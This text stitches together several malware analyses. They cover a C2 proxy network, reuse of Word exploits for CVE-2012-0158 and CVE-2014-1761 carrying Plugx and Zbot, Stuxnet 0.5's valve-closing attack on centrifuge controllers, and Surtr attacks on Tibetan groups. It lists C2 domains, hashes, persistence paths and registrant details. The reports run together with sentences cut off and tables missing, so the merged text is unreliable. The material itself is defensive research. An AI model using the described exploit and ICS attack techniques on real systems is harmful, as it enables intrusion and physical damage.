Most of the domains have been registered using the service `` reg.ru '' , but other services such as '' webdrive.ru '' , `` webnames.ru '' or `` timeweb.ru '' have been used as well .
During our monitoring , we observed the domains pointing to several malicious webservers .
A list of servers with confirmed malicious behavior can be found below .
In total , we have identified 10 different servers which exhibited confirmed malicious behavior .
Most of these severs are located in Germany , at Hetzner Online Ag .
During our analysis , we were able to obtain an image of one of the command - and - control servers .
The server itself proved to be a proxy , which was forwarding the request to another server on port 40080 .
The script responsible for redirections was found in /root / scp.pl and relies on the `` socat '' tool for stream redirection .
By scanning the Internet for computers with port 40080 open , we were able to identify three such servers in total , which we call `` mini - motherships '' : Connecting to these hosts on port 40080 and fetching the index page , we get the following standard content which is identical in all C & Cs : Fetching the index info ( via HTTP `` HEAD '' ) for these servers , reveals the following : It should be noted that the `` last modified '' field of the pages points to the same date : Tue , 21 Feb 2012 09:00:41 GMT .
This is important and probably indicates that the three known mini - motherships are probably just proxies themselves , pointing to the same top level `` mothership '' server .
This allows us to draw the following diagram of the C & C infrastructure as of November 2012 : For the Command and Control servers , the various generations of the backdoor connect to different scripts : For instance , the script `` /cgi - bin / nt / th '' is being used to receive commands from the command - and- control server , usually in the form of new plugins to run on the victim 's computer .
The `` /cgi - bin / nt / sk '' script is called by the running plugins to upload stolen data and information about the victim .
When connecting to the C & C , the backdoor identifies itself with a specific string which includes a hexadecimal value that appears to be the victim 's unique ID .
Different variants of the backdoor contain different victim IDs .
Presumably , this allows the attackers to distinguish between the multitudes of connections and perform specific operations for each victim individually .
For instance , a top level XLS dropper presumably used against a Polish target , named `` Katyn_- _ opinia_Rosjan.xls '' contains the hardcoded victim ID `` F50D0B17F870EB38026F '' .
A similar XLS named '' tactlist_05 - 05 - 2011_.8634.xls / EEAS New contact list ( 05 - 05 - 2011 ) .xls
Part 2 of this paper will cover malware modules and provide more technical details about their operation .
Malware authors are not shy about borrowing ideas .
One of the most typical cases is the Tomato Garden case , where several different groups used the same zero - day Microsoft Word exploit .
The term `` used '' means that they somehow get hold of a document that exploited the vulnerability , and then left the exploiting document part and the shellcode intact , only changed the appended encrypted executable at the end , and immediately they had what needed .
Something very similar happened just recently , in August and September of 2014 .
I always wanted to know how the malware writing groups worked .
I mean the really serious ones , the ones behind Chinese state - sponsored APT attacks , or the groups behind high profile common malware , like Zeus .
This case offers another piece of insight .
There must have been a staff meeting , where the manager prompted that , in the next malware distribution campaign they should not only use the aging CVE-2012 - 0158 vulnerability , but the newer CVE-2014 - 1761 as well .
The rest of the document will detail how some of the groups coped with this task .
Clearly , the malware authors took a sample somehow and started the implementation process .
I was n't there , of course , so what follows is an educated guess based on the samples .
Recently we saw a lot of samples that exploit both CVE-2012 - 0158 and CVE-2014 - 1761 , and usually either download or drop a Zbot variant .
The document starts with the RTF header stuff , followed by the encrypted second stage .
This is followed by the embedded object exploiting the CVE-2012 - 0158 vulnerability with the shellcode .
Following it is a block exploiting the CVE-2014 - 1761 with a shellcode of its own , as illustrated in the image below .
The color scheme I will use in the rest of the document is the following : green represents the properly used components ; yellow the unused components ; and red the incorrectly used components .
Regardless of the particular exploit used , both shellcodes performed the memory egg - hunting for the memory markers of the second stage ( as described in ) , and decrypted it when found .
The second stage could be either a downloader shellcode or a Win32 executable .
One of these samples was SHA1 : c3a7cb43ec13299b758cb8ca25eace71329939f7 , which contained an encrypted Zbot variant at the beginning of the RTF .
It looks very likely that this sample was used as a development template for the other malware writing groups .
The first attempt must have come from the group deploying Plugx .
They took the above mentioned sample , and made some modifications to it .
The result looks like this one : I can only guess that they did n't understand the CVE-2014 - 1761 component , and thought that there was only one shellcode , in the CVE-2012 - 0158 segment .
So they appended the encrypted Plugx executable , and replaced the first shellcode with their own .
This shellcode contains the hardcoded offset of the embedded executable , and decrypts from there .
However , they left intact the encrypted Zbot executable at the beginning of the file and the second vulnerability , making this sample a real dual weapon : not only that it exploits two vulnerabilities , but contains two totally different payloads .
However , Word can only be exploited once : during the exploitation procedure the current instance of Word exits , and a new one is started that displays the decoy document .
So this creates a race condition : whichever vulnerability is triggered first ( or gets lucky in an environment where the other one is patched ) will have the chance to run its own payload .
For that , they took another recent sample , something similar to those that drop Goldsun Trojans ( like this SHA1 : e2474cc0da5a79af876771217eb81974e73c39e5 ) In this case , the RTF only contains the CVE-2014 - 1761 vulnerability , with an appended executable .
The vulnerability expects the second stage shellcode at a fixed file offset , checks a marker string there ( `` p ! 11 '' ) , and jumps to the second stage , which then decrypts and executes the final Win32 payload .
A large group of samples were created by a sort of a fusion of the Zbot and the Goldsun samples , resulting in a structure like this one : So now there are two different shellcodes .
The first , from Plugx , reads the length of the embedded decoy document and Win32 payload from the end of the file , and using this info locates and decrypts the appended payload .
This shellcode identifies the host document by checking if the last dword is the same as the dword before that rotated by 3 .
And the same holds for another two dwords before that .
These dwords also store the length of the appended PE payload and decoy document lengths .
This structure makes it possible to swap the payload without changing the exploit and shellcode part .
The shellcode from Goldsun executes the second stage code from a fixed offset .
There are a couple of problems with this implementation .
First , the defunctional encrypted Zbot remains in these files , with no purpose at all .
But the real problem is with the Goldsun style CVE-2014 - 1761 block .
It was snatched from the CVE-2014 - 1761 exploiting document , and pasted after the existing Zbot+CVE-2012 - 0158 combo .
Clearly , the offset where the second stage code would be shifted with the different prepended content , but it never happened .
As a result , the CVE-2014 - 1761 exploitation does n't work , despite all the efforts of the malware authors .
A couple of distinct malware groups were identified that use these schematics .
All of these samples are Plugx v2 samples .
Most of the time they use Russian related themes in the decoy document .
The dropped decoy document does n't contain anything , it is only blank page .
Dropped to C : \Documents and Settings\All Users\DRM\AShld\AShld.exe ( clean loader , digitally signed by McAfee ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes . DLL ( malware loader ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes . DLL.asr ( payload ) ; registered for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\ AShld → ImagePath The payload is next generation Plugx , plugin function creation dates are 0x20130810 .
Two of the Plugx samples turned out to be very new developments .
Similar samples were just recently encountered from the list generated by a researcher .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 Dropped to C : \Documents and Settings\All Users\DRM\KavSky\m.exe ( clean loader , digitally signed by Kaspersky ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll ( malware loader ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll.eng ( payload ) ; registered in for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\KavSky → ImagePath The payload is next generation Plugx , plugin function creation dates are 20140719 decimal .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 This sample used a Myanmar related decoy theme , likely part of a separate distribution campaign .
Not connected to Plugx at code level , but the overlap between the C & C servers , the same domain registration contact ( yuminga1 @ 126.com ) , and the similar Russian theme indicates that the same group deployed them .
Registered for startup with unusual autostart method , briefly touched in .
A Microsoft patch file is dropped to % WINDOWS % \AppPatch\Custom\ { 099BF1AE-6A93- 493D-0C48 - 2453E7FBC801 } .sdband
That file loads AcProtect.dll as a library component .
The dumped payload shows similar functionality to what Plugx ( or any other general purpose backdoor ) has , but on a code level it is very different .
C & C servers adobeflashupdate.dynu.com Dynamic DNS service transactiona.com Domain Status : clientTransferProhibited Registrant Postal Code : 100191 Registry Registrant ID : Registrant Country : CN Registrant Name : qiuping liu Registrant Phone : + 86.1052810955 Registrant Organization : huajiyoutian Registrant Phone Ext : Registrant Street : beijing Registrant Fax : + 89.1052810955 Registrant City : Beijing Registrant Fax Ext : Registrant State / Province : BJ Registrant Email : yuminga1 @ 126.com systemupdate5.dtdns.com Dynamic DNS service 9bc128f120996677d3c4f7c1d7506315b232e49e Original name : План космической деятельности на 2015 - 2020 год.doc Dropped to % PROFILE % \Local Settings\Temp\3.tmp ; 64 bit malware components , refer to the same files names that are used by 0dfd883c1f205f0740d50688683f1869bcc0e9d7 C & C servers : N / A There were a few other samples , but all single .
Kamics : 712df1f1f11f63e2154eb9023d584be62ef100b8 Original name : N / A The dropped decoy document is a password protected Word file , content is not visible in the lack of the correct password .
System activity Dropped to % PROFILE % \Local Settings\Temp\msvcpdl100.dll ( SHA1 : 51346d70ea97a7aaef80f98c4891526443b2696c ) and C : \MsBuild\Microsoft\Windows\System32\ svchost.exe ( SHA1 : 2196770391bdbdd15bce5895427ec99b1bef0868 ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Kaspersky Internet Security C & C servers buglaa.sportnewsa.net Farfli : 960ac7329a6e80682959d6da0469921f8167e79a Original name : MoFA Note- Verbale on 19.8.14.doc System activity Dropped to % PROFILE % \Application Data\winlog.exe ( SHA1 : 511f2055a56c0f458b1b14cc207730d0fe639df4 ) and % PROFILE % \Application Data\winlog.dll ( SHA1 : bb185efd35f7b4892a32e7853e044e94502a36af ) C & C servers unisers.com Domain Status : clientTransferProhibited Registrant State : Beijing Registry Registrant ID : Registrant Postal Code : 100001 Registrant Name : wang cheng Registrant Country : CN Registrant Organization : wang cheng Registrant Phone : + 86.01085452454 Registrant Street : BeijingDaguoROAD136 Registrant Fax : + 86.01085452454 Registrant City : Beijing Registrant Email : bitumberls .
There were two samples that followed the above structure , and the Goldsun shellcode offset was fixed .
However , both samples were only dropping and executing a Chinese nationalized version of calc .
Furthermore , a couple of common malware samples were found with fixed second stage offsets , showing that at least these guys know what they are doing .
Still , they kept the inactive encrypted Zbot at the beginning of the document .
Among the samples conventional Zbots variants were also found .
These showed up in Middle Eastern countries , and have Arabic themes as a decoy .
The end of encrypted PE is truncated , and the CVE-2012 - 0158 code is replaced with the Plugx shellcode .
Interestingly , there is another shellcode , which is starts with the same marker ( `` p ! 11 '' ) as the Goldsun second stage code , but the execution logic is the same as the Plugx shellcode .
However , this shellcode just hangs in the air , no execution path leads to it .
It is not clear , where these samples fit in the development path , could be that after the failure to integrate CVE-2014 - 1761 , the corresponding part was simply ditched from the samples .
Dropped to % PROFILE % \Application Data\Erease.vbe , that connects to the C & C server .
The dropped decoy document is bogus , a truncated copy of the exploited document .
Apart from the lesson learned about malware development , what can we learn from this process ? The partially successful Plugx attempt raises a few questions .
Should it be considered as a common cybercrime sample ( as the dropped Zbot suggests ) or as an APT ( as Plugx does ) ? Actually , it depends on the patch level of the targeted computer .
The narrow line between APT and common malware shrank to zero with that sample .
We have seen earlier6 that authors of common malware are getting the idea of document - based exploitation from the APT players .
Now it is swinging back – targeted attack players are snatching ideas from the other group .
The fact that the attempt was less successful does not deny the fact that a symbiosis exists between the two distinct criminal groups , and ideas are floating in both directions .
References : United Kingdom and Worldwide Sales North American Sales Australia and New Zealand Sales Asia Sales Tel : + 44 ( 0 ) 8447 671131 Toll Free : 1 - 866 - 866 - 2802 Tel : + 61 2 9409 9100 Tel : + 65 62244168 Email : sales @ sophos.com Email : nasales @ sophos.com Email : sales @ sophos.com.au Email : salesasia @ sophos.com Oxford , UK | Boston , USA © Copyright 2014 .
Sophos Ltd. All rights reserved .
Registered in England and Wales No .
In 2010 , Symantec reported on a new and highly sophisticated worm called Stuxnet .
This worm became known as the first computer software threat that was used as a cyber - weapon .
The worm was specifically designed to take control over industrial plant machinery and making them operate outside of their safe or normal performance envelope , causing damage in the process .
This was a first in the history of malware .
Clues in the code pointed to other versions of the worm which could potentially perform different actions leaving an open question about Stuxnet and how it came to be .
The wait for the missing link is now over .
Symantec have now discovered an older version of Stuxnet that can answer the questions about the evolution of Stuxnet .
This newly discovered variant has been dissected and analyzed in detail and here is a summary of our key findings : • Stuxnet 0.5 is the oldest known Stuxnet version to be analyzed , in the wild as early as November 2007 and in development as early as November 2005 .
Stuxnet 0.5 : The Missing Link Whether Stuxnet 0.5 was successful is unclear , but later versions of Stuxnet were developed using a different development framework , became more aggressive , and employed a different attack strategy that changed the speeds of the centrifuges instead instead suggesting Stuxnet 0.5 did not completely fulfill the attacker 's goals .
More versions of Stuxnet are known to exist , but have never been recovered .
Table 1 Stuxnet 0.5 was submitted to and generally are in the range of the year 2001 .
Table 2 Table 3 Based on an internal version number Stuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform .
Over time , the developers appear to have migrated more towards the Tilded platform .
The developers actually re - implemented Flamer - platform components using the Tilded platform in later versions .
Both the Flamer and Tilded platform code bases are different enough to suggest different developers were involved .
Stuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than modifying centrifuge speeds , as in versions 1.x of Stuxnet .
Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files .
Using the Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability ( CVE- 2012 - 3015 ) , the S7hkimdb.dll file is executed , which then decrypts and injects the main XR00001.MDX Stuxnet binary file into the services.exe process .
Stuxnet is now executing on the system .
Once injected into the services.exe process , a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver .
The main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf .
The companion DLL that implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf .
When the system is booted , the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry , decrypt the main Stuxnet binary , and inject it into the Explorer and Step 7 processes .
The payload DLL will be decrypted as well and injected into the Explorer process .
When loading dynamic - link library ( DLL ) resources , Stuxnet makes use of a module that mimics LoadLibrary rather than calling LoadLibrary itself .
This technique is likely used to avoid security software and was not seen in versions 1.x of Stuxnet .
A second driver , PCIBUS.SYS , is also created which causes a forced reboot by generating a BSoD ( Blue Screen of Death ) 20 days after installation .
A third driver , USBACC11.SYS , is then installed .
This driver is similar to the MRXCLS.SYS driver , but instead decrypts and injects DLLs for peer - to - peer and C & C communication into the svchost.exe and Internet Explorer processes .
The structure and organization as well as resource and export listings of each component is available in Appendix D. Stuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4 , 2009 .
Certain modules may also not be created or loaded if security software is present .
A list is available in Appendix B .
A variety of additional files are created , including log files and configuration files .
A list is available in Appendix A. Stuxnet 0.5 uses one form of replication through Step 7 project archives .
When a removable drive is inserted in an infected system , Stuxnet 0.5 will infect any Step 7 project archives with a .s7p
In addition , Step 7 project archives on the local disk will also be infected .
Therefore Stuxnet 0.5 spreads to additional machines through removable drives or through human - initiated sharing of infected Step 7 project archives , for example through email .
Stuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions ( as described in W32 .
Stuxnet Dossier , Step 7 Project File Infections ) .
The following is an example file listing of an infected Step 7 project file .
In particular , Stuxnet 0.5 does not provide fine grained control to its authors .
Instead , Stuxnet 0.5 can only download new code and update itself .
Stuxnet needs to ultimately spread on isolated networks with no Internet access , therefore it has been designed to be autonomous to reduce the need for robust and fine grained command - and - control .
Stuxnet 0.5 also uses a secondary peer - to - peer mechanism to propagate these code updates to peers on networks inaccessible to the broader Internet .
Command - and - control is implemented by the inetpsp.dll file while peer - to - peer communications are implemented by the netsimp32.dll file .
Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes .
Stuxnet 0.5 has four C & C servers , all of which are now either unavailable or have since been registered by an unrelated party : • smartclick.org • best-advertising.net • internetadvertising4u.com • ad-marketing.net Interestingly , Stuxnet 0.5 is programmed to stop contacting the C & C server after January 11 , 2009 , even though the threat is programmed to only stop spreading after a later date of July 4 , 2009 .
Figure 1 The C & C server domains were created in 2005 and all displayed Internet advertising agency homepage for Stuxnet C & C servers the same front page purporting to be an Internet advertising agency named Media Suffix ( figure 1 ) with the tag line `` Believe What the Mind Can Dream '' .
The servers were hosted on commercial hosting providers in the United States , Canada , France , and Thailand .
The fact that these domains were in operation since 2005 , suggests that the Stuxnet project started more than seven years ago .
The first request by Stuxnet 0.5 uses the following form : This notifies the C & C server of an active successful infection .
Next , Stuxnet 0.5 sends the following request : This may download and execute a file if an update is available .
The final target network for Stuxnet 0.5 was likely isolated from the Internet .
To allow updates to reach these machines , Stuxnet 0.5 also used a peer - to - peer mechanism .
As long as one updated version was introduced into this network - for example through an infected USB key - all the other infected machines on the network could receive updates or new code modules .
Stuxnet 0.5 uses Windows mailslots for peer - to - peer communication .
Mailslots allow a process to pass a message to another process on a remote machine .
Stuxnet 0.5 enumerates all machines on the network and attempts to connect to a mailslot named \\ [ REMOTE MACHINE NAME ] \mailslot\svchost .
It then provides a callback mailslot name of \\ [ LOCAL MACHINE NAME ] \mailslot\imnotify .
Stuxnet 0.5 uses these mailslots for peer - to - peer communication and to pass code updates .
In addition , Stuxnet 0.5 may configure systems to allow anonymous logins and then provides the following file shares : This allows file retrieval by peer infections .
Shared files include : Man - in - the - Middle In order to both fingerprint the target system and inject malicious Programmable Logic Controller ( PLC ) code , Stuxnet 0.5 replaces two Step 7 DLLs in order to hijack communications with a PLC .
The first DLL , s7otbxdx.dll , is hijacked in order to insert the malicious PLC code .
The same technique was used in Stuxnet versions 1.x ( as described in W32.Stuxnet Dossier , Modifying PLCs ) .
Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC , otherwise the behavior remains generally the same .
The second DLL , s7aaapix.dll , is used for fingerprinting the target system and building DB8061 , a PLC data block needed to conduct the attack .
The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values ( 0x91E55A3D , 0x996AB716 , 0x4A5CBB03 ) in order to build or provide a previously built DB8061 data block for injection .
Stuxnet hijacks AUTDoVerb in order to monitor any `` DOWNLOAD '' verb actions , which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target system is still correctly configured .
Fingerprinting and building DB8061 Table 4 iceNumber > A valve in module A21 , also in cascade 8 , and associated with centrifuge 160 , would have the symbol label PV- A21 - 8 - 160 , for example .
Each field is defined as follows : Delimiter Either space ( `` `` ) , hyphen ( `` - '' ) , underscore ( `` _ '' ) , or not present at all .
If the string is `` PIA '' ( Pressure Indicator Alarm ) , it is expected to be followed by a one digit number .
These strings will represent the device type ( a valve , a transducer , or a status light , for instance ) .
These strings match cascade modules in Natanz , Iran , seen publicly described as `` A24 '' , `` A26 '' , and `` A28 '' .
This two digit number is the number representation of the letter for A to R. DeviceNumber This is parsed in a more complex fashion depending on the device type as determined by the function identifier and caters to three possible cascade arrangements .
The device type mappings to function identifiers are available in Appendix C. Device type 0 A string of digits : If the length of the digits is less than three , the device type is changed to device type 6 .
If the length of the digits is greater than or equal to three , the device type is changed to device type 7 .
Device type 1 , 2 , 3 `` # # '' : A two digit number in the range 1 to 25 .
Device type 4 , 5 , or 7 Device type 4 , 5 , or 7 has three different formats : Format 1 `` # # # # '' : Decoded as two separate two - digit numbers representing the stage number and the centrifuge number within the stage , respectively .
The stage number must be in the decimal range 1 to 15 , which matches with the known Natanz configuration .
For each of these 15 stages , the maximum number of expected centrifuges in each corresponding stage is looked up in the following array .
Table 5 This means , for example , stage 3 is expected to have a second two digit number equal to 4 or less .
This requirement is consistent with the centrifuge arrangement within a cascade .
Format 2 `` # # # '' : A three digit number that must be less than 164 , which is the number of centrifuges in a cascade .
Format 3 `` # # L '' : A two digit number followed by a letter .
The letter must be in the range A to D , and the number must be in the decimal range 1 to 43 .
This arrangement sub - divides each stage into sub - clusters of four .
Device type 6 `` # # '' : A two digit number in the range 1 to 30 .
Device type 8 , 9 , B , or C `` # # '' : A two digit number in the range 1 to 3 .
Device type A `` # # < delimiter > < string > '' : A two digit number in the range 1 to 3 with an optional string preceded by a delimiter character .
The string must start with the letter S and contain the letter P. If the string is present , the device is modified to be device type 0xB instead ( Flow Rate Transmitter Controller Output , rather than device type 0xA which is Flow Rate Transmitter Controller Input ) .
Based on the symbol fingerprinting , the following table summarizes what devices and labels Stuxnet looks for within the symbol table .
Table 6 Symbol address parsing Each symbol label will have two corresponding addresses : -- the address in the process image area and the direct peripheral address of the device represented by the symbol .
Modifying the memory at these addresses allows the PLC to control and read the behavior of the associated device .
For example , the value may be a Boolean value turning a switch on or off , or a 16-bit value representing the current temperature of the system .
Addresses can be either outputs ( the PLC sets the value to modify the behavior of the device ) or inputs ( the PLC reads the value to determine the current state of the device ) .
Device types 0 , 1 , 5 , and B must be output addresses and device types 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , A , and C must be input addresses .
Values at addresses for device types 0 , 1 , 2 , 3 , 4 , and 5 must be bit values .
Values at addresses for device types 6 , 7 , 8 , 9 , A , B , and C must be 16-bit values .
Cascade rating and building DB8061 After parsing the symbols and addresses for each cascade , the code inspects the configuration of each cascade .
Depending on the configuration , a rating is calculated .
Certain devices in certain configurations will result in higher ratings .
When complete , only the six highest - rated cascades have data written to DB8061 .
Finally , a flag is set signifying DB8061 has been built .
This flag is reset to 0 every time the `` DOWNLOAD '' verb is executed .
The code conducts an attack by closing valves in the six top rated cascades out of the possible 18 cascades .
The states of two types of valves are modified : • Centrifuge valves – a set of three valves ( feed , product , tails ) that work in unison per centrifuge to control uranium hexafluoride ( UF6 ) flow into each centrifugeStage valves – one per stage to control UF6 flow into each stage • Auxiliary valves – valves that control UF6 flow into or out of each stage ( stage valve ) or the cascade as a whole Figure 2 Similar to version 1.x of Stuxnet , the PLC device attack code consists of a state machine with eight possible states : State 0 ( Wait ) : Perform system identification and wait for the enrichment process to reach steady state before attack .
This can take approximately 30 days .
State 1 ( Record ) : Take peripheral snapshots and build fake input blocks for replaying later .
State 2 ( Attack centrifuge valves ) : Begin replaying fake input signals .
Close valves on most centrifuges .
State 3 ( Secondary pressure reading ) : Open both centrifuge and feed stage valves in the final stage of a single cascade to obtain a low pressure reading .
State 4 ( Wait for pressure change ) : Wait for desired pressure change or time limit .
This can take up to approximately two hours .
State 5 ( Attack auxiliary valves ) : Open all auxiliary valves except valves believed to be near the first feed stage ( stage 10 ) .
Wait for three minutes in this state .
State 6 ( Wait for attack completion ) : Wait for six minutes while preventing any state changes .
State 7 ( Finish ) : Reset and return to state zero .
Figure 3 State 0 : The code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the amount of elapsed time .
In addition , the code determines if most of the centrifuge valves are in the open or closed position .
Only if these all conditions are met does the code proceed to state 1 .
State 1 : There are 21 snapshots of the peripheral I / O values that are taken one second apart .
These values are stored for replay during the attack .
This prevents systems and technicians from realizing the system is no longer operating as expected .
State 2 : First , the normal operating pressure is obtained and stored for replay later .
For each stage a portion of all the centrifuge valves are closed , except in the feed stage ( stage 10 ) .
The centrifuge valves in the feed stage remain completely open , while the centrifuge valves at both the product end and tails end are completely closed .
The particular centrifuge valves closed per stage are randomly chosen .
The code will randomly chose a starting centrifuge valve and then close the next one in order until the last centrifuge valve in the stage .
If the total desired number of valves to close for that stage has not been reached , the code will continue from the first centrifuge valve in the stage until the maximum valves to close are reached .
Table 7 State 3 : In state 3 , in a single cascade , both centrifuge valves in stage 1 are opened and it is likely the stage valve of stage 1 is also opened .
Then , the code obtains a pressure reading at stage 1 .
The pressure should be relatively low .
This value is used for replay in later stages .
If the normal pressure operating pressure was n't obtained properly in state 2 , state 3 is actually skipped and hardcoded default values are used instead .
State 4 : State 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5 .
If any of the following conditions are met , the code will continue to state 5 : • The pressure of the stage 10 or stage 11 transducer ( these are likely transducers for or near the feed stage ) has an absolute value greater than 280 units above the expected value and greater than five times the expected value .
State 5 : In state 5 , all the auxiliary valves are opened except valve numbers 17 , 18 , and 20 .
Before continuing to state 6 , the code waits for at least 2 minutes and 53 seconds .
State 6 : During state 6 , fake values continue to be replayed and any attempts to change device values are prevented for 6 minutes and 58 seconds .
State 7 : Data is reset and the code returns to state 0 .
By closing all valves except the initial feed stage valves , UF6 will continue to flow into the system .
This act alone may cause damage to the centrifuges themselves .
However , the attack expects the pressure to reach five times the normal operating pressure .
At this pressure , significant damage to the uranium enrichment system could occur and the UF6 gas could even revert to a solid .
Whether the attack succeeded in this manner or not remains unclear .
Even if the attack did succeed , the attackers decided to move to a different strategy in the Stuxnet 1.x versions , attacking the speed of the centrifuges instead .
Stuxnet 0.5 clarifies the evolution and history of Stuxnet .
Stuxnet clearly became more aggressive over time and switched development platforms as it evolved from 0.5 versions to later 1.x versions .
Key parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5 .
This demonstrates that the 417 attack code was the first attack strategy implemented by Stuxnet .
This original 417 attack code attempted to modify valve states during the uranium enrichment process at Natanz , Iran , to cause damage to the centrifuges and the system as a whole .
Figure 4 The success of Stuxnet 0.5 remains Low - enriched uranium production ( source ISIS ) unknown .
However , the chart in figure 4 references uranium enrichment production at Natanz to key milestones of Stuxnet development .
Interesting events are dips in feed or production amounts and lower levels of production given the same or greater feed amounts ( shown as gaps between the two lines ) .
While the discovery of Stuxnet 0.5 helps to deepen our overall understanding of Stuxnet and what its goals are , versions remain unrecovered .
If these are located , they may expose other secrets behind this operation and more clues to its origins , but obtaining these other samples may prove to be next to impossible .
Table of each allowed function identifier , the corresponding device type , and the assumed device name .
Table 8 Organization of Stuxnet 0.5 components and behavior of each export .
Figure 5 Table 9 W32.Duqu http : //www.symantec.com / security_response / writeup.jsp ? docid=2011 - 101814 - 1119 - 99 W32.Flamer http : //www.symantec.com / security_response / writeup.jsp ? docid=2012 - 052811 - 0308 - 99 W32.Stuxnet http : //www.symantec.com / security_response / writeup.jsp ? docid=2010 - 071400 - 3123 - 99 Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability ( CVE-2012 - 3015 ) http : //www.securityfocus.com / bid/54651 Stuxnet 0.5 : The Missing Link http : //www.symantec.com / connect / blogs / stuxnet-05-missing - link Stuxnet 0.5 : Disrupting Uranium Processing At Natanz http : //www.symantec.com / connect / blogs / stuxnet-05-disrupting - uranium - processing - natanz Stuxnet 0.5 : How it Evolved http : //www.symantec.com / connect / blogs / stuxnet-05-how - it - evolved Stuxnet 0.5 : Command - and - Control Capabilities http : //www.symantec.com / connect / blogs / stuxnet-05-command - and - control - capabilities Symantec would like to thank the Institute for Science and International Security ( ISIS ) for their continued assistance in understanding centrifugal uranium enrichment systems .
About Symantec Symantec protects the world 's information , and is a global leader in security , backup and availability solutions .
Our innovative products and services protect people and information in any environment – from the smallest mobile device , to the enterprise data center , to cloud- based systems .
Our world - renowned expertise in protecting data , identities and interactions About the authors gives our customers confidence in a connected Geoff McDonald - Threat Analysis Engineer world .
More information is available at Liam O Murchu - Development Manager Stephen Doherty - Sr Threat Intelligence Analyst www.symantec.com or by connecting with Eric Chien - Distinguished Engineer Symantec at : go.symantec.com/socialmedia .
For specific country offices and contact num- Symantec Corporation Copyright © 2013 Symantec Corporation .
All rights reserved .
Symantec and the Symantec logo are trademarks or registered bers , please visit our Web site .
For product World Headquarters trademarks of Symantec Corporation or its affiliates in the information in the U.S. , call 350 Ellis Street U.S. and other countries .
Other names may be trademarks of their respective owners .
Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 www.symantec.com Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
August 2 , 2013 Tagged : Malware , targeted threats , Tibet Categories : Reports and Briefings , Research News by Katie Kleemola and Seth Hardy As part of our ongoing study into targeted attacks on human rights groups and civil society organizations , the Citizen Lab analyzed a malicious email sent to Tibetan organizations in June 2013 .
The email in question purported to be from a prominent member of the Tibetan community and repurposed content from a community mailing list .
Attached to the email were what appeared to be three Microsoft Word documents ( .doc
All three attachments drop the exact same malware .
We have seen the Surtr malware family used in attacks on Tibetan groups dating back to November 2012 .
While the malicious attachments appear to be DOC files due to their file extension , they are actually RTFs crafted to exploit a vulnerability in Microsoft Word : CVE-2012 - 0158 .
This particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10 , 2012 .
Currently , the sample is detected as malicious by 34 percent of antivirus ( AV ) engines on VirusTotal ( VT ) .
The malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups .
This template was created in March 2013 and , instead of specifically using the vulnerable ActiveX controls described in the vulnerability description , it utilizes the Chartspace Office Web Component .
This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code .
Figure 1 : Hexdump of the malicious attachment Although CVE-2012 - 0158 was first published and used in the wild in April 2012 , samples using this template were only initially detected by three AV engines ( on VT ) .
Therefore , while a third of AV engines had a detection signature for CVE-2012 - 0158 as late as April 2013 , it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products .
This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT .
This vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments .
Malicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory .
Surtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function .
It also creates the following folders : % ALL USERS % /Application Data / Microsoft / Windows/123 % ALL USERS % /Application Data / Microsoft / Windows / Burn % ALL USERS % /Application Data / Microsoft / Windows / LiveUpdata_Mem It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders .
The copy in the Burn folder is called [ VICTIM COMPUTER NAME ] .dll
These copies will differ from the original payload dropped in the % TEMP % folder by filling the resource section with varying amounts of 00 bytes .
This also results in the malware having a much larger file size ( 30 - 50 mb ) possibly in an attempt to evade antivirus heuristics .
Surtr connects to a command and control server ( C2 ) and downloads a stage two component to % ALL USERS % /Application Data / Microsoft / Windows / Burn/ _ [ VICTIM COMPUTER NAME ] .log
This particular sample connects to internet.3-a.net on port 9696 .
